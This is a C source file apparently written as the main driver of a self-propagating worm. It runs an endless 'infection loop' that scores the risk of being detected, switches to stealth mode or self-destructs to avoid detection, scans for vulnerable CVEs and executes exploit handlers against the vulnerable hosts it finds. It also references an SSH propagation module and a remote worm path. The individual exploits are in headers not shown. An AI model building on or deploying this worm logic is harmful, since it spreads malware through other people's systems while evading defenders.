#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "risk_assessment.h"
#include "handler_registry.h"
#include "decision_engine.h"
#include "state_manager.h"
#include "degradation.h"
#include "utils.h"
#include "cve_ssh_propagation.h"

// Configuration
#define REMOTE_WORM_PATH "/tmp/worm"

// Phase 1: Scan
// Calls all registered scan handlers
// Each handler decides what to scan (local or remote) internally
// target_ip parameter may be ignored by handlers that perform their own scanning
static cve_result_vector_t phase1_scan(const char* target_ip) {
    return scan_all_handlers(target_ip);
}

// Phase 2: Decision
// Determines which CVE to execute based on scan results and risk assessment
// Risk thresholds: <4 = normal, 4-6 = stealth, >=7 = self-destruct
static decision_result_t phase2_decision(cve_result_vector_t* scan_results, 
                                         risk_assessment_t* risk) {
    degradation_mode_t mode = MODE_NORMAL;
    // Enter stealth mode if risk is high but not critical
    if (risk->total_risk >= 4 && risk->total_risk < 7) {
        mode = MODE_STEALTH;
    }
    
    return make_decision(scan_results, risk, mode);
}

// Phase 3: Execute
static int phase3_execute(int cve_id, const char* target_ip, const char* argv0) {
    (void)argv0;
    
    cve_handler_config_t* handler = get_handler(cve_id);
    if (!handler) {
        printf("[-] Handler not found for CVE ID %d\n", cve_id);
        return 0;
    }
    
    if (target_ip) {
        printf("[*] Executing CVE ID %d on %s...\n", cve_id, target_ip);
    } else {
        printf("[*] Executing CVE ID %d...\n", cve_id);
    }
    
    int execution_success = call_execution_handler(handler, target_ip);
    
    if (execution_success) {
        if (target_ip) {
            printf("[+] Execution successful on %s\n", target_ip);
        } else {
            printf("[+] Execution successful\n");
        }
        update_successful_operation();
        return 1;
    } else {
        if (target_ip) {
            printf("[-] Execution failed on %s\n", target_ip);
        } else {
            printf("[-] Execution failed\n");
        }
        update_failed_operation();
        return 0;
    }
}

int main(int argc, char* argv[]) {
    (void)argc;
    
    printf("=== CVE-Aware, Safely-Degrading Worm ===\n");
    
    init_handler_registry();
    init_decision_rules();
    init_state();
    
    sleep(2);
    
    // Main infection loop: 4-phase engine (Risk Assessment -> Scan -> Decision -> Execute)
    while (1) {
        printf("\n[*] Starting infection round...\n");
        
        // Phase 0: Risk Assessment - evaluates detection signals before any operations
        risk_assessment_t risk = assess_risk();
        printf("\n=== RISK ASSESSMENT ===\n");
        printf("[*] Total Risk: %d/10\n", risk.total_risk);
        printf("[*] Network Risk: %d/10\n", risk.network_risk);
        printf("[*] System Risk: %d/10\n", risk.system_risk);
        printf("[*] Behavioral Risk: %d/10\n", risk.behavioral_risk);
        
        // Critical risk threshold: self-destruct to avoid detection
        if (risk.total_risk >= 7) {
            printf("\n[!] CRITICAL RISK DETECTED (>= 7/10)\n");
            printf("[!] Entering SELF-DESTRUCTION mode...\n");
            self_destruct();
            break;
        }
        
        // High risk threshold: reduce activity but continue operations
        if (risk.total_risk >= 4) {
            printf("\n[!] HIGH RISK DETECTED (>= 4/10)\n");
            printf("[!] Entering STEALTH mode...\n");
            enter_stealth_mode();
        } else {
            printf("[+] Risk level acceptable, proceeding with normal operations\n");
        }
        
        // Phase 1: Scan - call all scan handlers
        // Each handler decides what to scan (local or remote) internally
        printf("\n=== SCAN PHASE ===\n");
        cve_result_vector_t scan_results = phase1_scan(NULL);
        printf("[*] Scan complete: %d CVE handler(s) checked\n", scan_results.count);
        
        // Log scan results
        printf("\n=== SCAN RESULTS ===\n");
        for (int j = 0; j < scan_results.count; j++) {
            cve_scan_result_t* result = &scan_results.results[j];
            printf("[*] CVE ID %d: ", result->cve_id);
            if (result->is_vulnerable) {
                printf("VULNERABLE (confidence: %d/10", result->confidence);
                if (result->port_open > 0) {
                    printf(", port %d open", result->port_open);
                }
                if (result->service_type[0] != '\0') {
                    printf(", service: %s", result->service_type);
                }
                printf(")\n");
            } else {
                printf("NOT VULNERABLE (confidence: %d/10)\n", result->confidence);
            }
        }
        
        // Phase 2: Decision - select best CVE based on priority and conditions
        printf("\n=== DECISION PHASE ===\n");
        decision_result_t decision = phase2_decision(&scan_results, &risk);
        
        // Decision engine evaluates all registered CVEs in priority order
        // First CVE that meets all criteria (vulnerable, port, confidence, risk, mode) is selected
        if (!decision.should_execute) {
            printf("[-] No suitable CVE selected\n");
            printf("[-] Reason: No CVE met all decision criteria (vulnerable, port, confidence, risk, mode)\n");
        } else {
            printf("[+] Selected CVE ID %d for execution\n", decision.selected_cve_id);
            
            // Phase 3: Execute - run the selected CVE's execution handler
            // Execution handler uses vulnerable hosts discovered during scan phase
            printf("\n=== EXECUTION PHASE ===\n");
            printf("[*] Executing CVE ID %d...\n", decision.selected_cve_id);
            if (phase3_execute(decision.selected_cve_id, NULL, argv[0])) {
                printf("[+] Execution successful\n");
            } else {
                printf("[-] Execution failed\n");
                update_failed_connection();
            }
        }
        
        printf("[*] Round complete. Sleeping 20 seconds...\n");
        sleep(20);
    }
    
    return 0;
}

